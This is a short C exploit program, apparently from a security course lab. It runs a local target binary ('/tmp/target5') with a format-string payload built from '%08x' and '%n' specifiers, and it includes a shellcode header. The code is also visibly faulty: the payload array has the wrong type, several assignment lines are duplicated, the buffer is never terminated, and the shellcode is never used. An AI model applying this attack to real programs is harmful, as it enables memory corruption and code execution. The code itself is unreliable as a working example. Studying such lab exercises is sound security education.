#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];
  char *overflow[200];
  int i;
  
  for(i=0;i<200;i++){
    overflow[i]='h';
  }
  overflow[128]='%';
  overflow[129]='0';
  overflow[130]='8';
  overflow[131]='x';  
  overflow[128]='%';
  overflow[129]='0';
  overflow[130]='8';
  overflow[131]='x';
  overflow[132]='%';
  overflow[133]='n';  

  args[0] = TARGET; args[1] = overflow; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
